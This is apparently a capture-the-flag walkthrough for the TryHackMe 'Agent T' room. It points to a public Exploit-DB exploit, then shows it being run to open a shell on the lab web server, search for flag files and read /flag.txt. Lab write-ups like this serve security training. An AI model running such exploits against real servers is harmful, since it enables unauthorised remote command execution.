## Agent T
https://tryhackme.com/room/agentt

## Flag

![image](https://user-images.githubusercontent.com/6504854/194846964-8570a2d4-7619-4442-9b1d-b661624c765d.png)

HINT:Look closely at the HTTP headers when you request the first page...

https://www.exploit-db.com/exploits/49933

Copy+Paste as exploit.py

```
chmod +x exploit.py
python exploit.py
Enter the full host url:
http://10.10.37.138/

Interactive shell is opened on http://10.10.37.138/ 
Can't acces tty; job crontol turned off.

$ ls -la
total 760
drwxr-xr-x 1 root root   4096 Mar  7  2022 .
drwxr-xr-x 1 root root   4096 Mar 30  2021 ..
-rw-rw-r-- 1 root root    199 Mar  5  2022 .travis.yml
-rw-rw-r-- 1 root root  22113 Mar  5  2022 404.html
-rw-rw-r-- 1 root root  21756 Mar  5  2022 blank.html
drwxrwxr-x 2 root root   4096 Mar  5  2022 css
-rw-rw-r-- 1 root root   3784 Mar  5  2022 gulpfile.js
drwxrwxr-x 2 root root   4096 Mar  5  2022 img
-rw-rw-r-- 1 root root  42145 Mar  7  2022 index.php
drwxrwxr-x 3 root root   4096 Mar  5  2022 js
-rw-rw-r-- 1 root root 642222 Mar  5  2022 package-lock.json
-rw-rw-r-- 1 root root   1493 Mar  5  2022 package.json
drwxrwxr-x 4 root root   4096 Mar  5  2022 scss
drwxrwxr-x 8 root root   4096 Mar  5  2022 vendor

$ find / -type f -name *flag* 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/usr/local/lib/php/build/ax_check_compile_flag.m4
/var/www/html/vendor/fontawesome-free/svgs/brands/font-awesome-flag.svg
/var/www/html/vendor/fontawesome-free/svgs/regular/flag.svg
/var/www/html/vendor/fontawesome-free/svgs/solid/flag-usa.svg
/var/www/html/vendor/fontawesome-free/svgs/solid/flag-checkered.svg
/var/www/html/vendor/fontawesome-free/svgs/solid/flag.svg
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/flag.txt

$ cat /flag.txt                   
flag{41******************************b}
$ 
```
😄😄😄
